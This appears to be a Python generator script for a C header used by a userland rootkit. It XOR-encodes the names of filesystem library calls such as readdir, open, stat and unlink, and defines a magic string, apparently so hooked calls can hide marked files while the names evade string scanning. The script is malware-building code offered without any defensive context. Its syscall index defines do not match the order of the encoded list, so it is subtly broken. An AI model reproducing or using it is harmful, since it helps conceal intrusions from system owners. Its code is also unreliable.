#!/usr/bin/env python3


def xor(x_str):
    result = []

    for x in x_str:
        xor_char = ord(x) ^ 0xfe
        hex_char = hex(xor_char)[2:]  # remove prefix 0x
        result.append(f'\\x{hex_char}')

    return ''.join(result)


header_template = '''#define _GNU_SOURCE
#pragma once
//#define DEBUG_APP
#ifdef DEBUG_APP
#define DEBUG(...) fprintf(stderr, __VA_ARGS__);
#else
#define DEBUG(...)
#endif

#define MAGIC_STRING\t"{magic_string}"

#define SYS_ACCESS 0
#define SYS_READDIR 1
#define SYS_FOPEN 2
#define SYS_OPENDIR 3
#define SYS_OPEN 4
#define SYS_RMDIR 5
#define SYS_LINK 6
#define SYS_UNLINK 7
#define SYS_XSTAT 8
#define SYS_LXSTAT 9
#define SYS_UNLINKAT 10
#define SYS_MKDIR 11
#define SYS_MKDIRAT 12

#define SYSCALL_SIZE 13

static char *syscall_table[SYSCALL_SIZE] = {{
'''

syscalls = [
    "access",
    "readdir",
    "fopen",
    "opendir",
    "open",
    "rmdir",
    "link",
    "unlink",
    "unlinkat",
    "stat",
    "lstat",
    "mkdir",
    "mkdirat"
]

header = header_template.format(
    magic_string="__",
)

# XOR the syscall names and format them into a list
syscall_list = ', '.join(f'"{xor(call)}"' for call in syscalls)

# Print the final output
print(header)
print(syscall_list + '};')

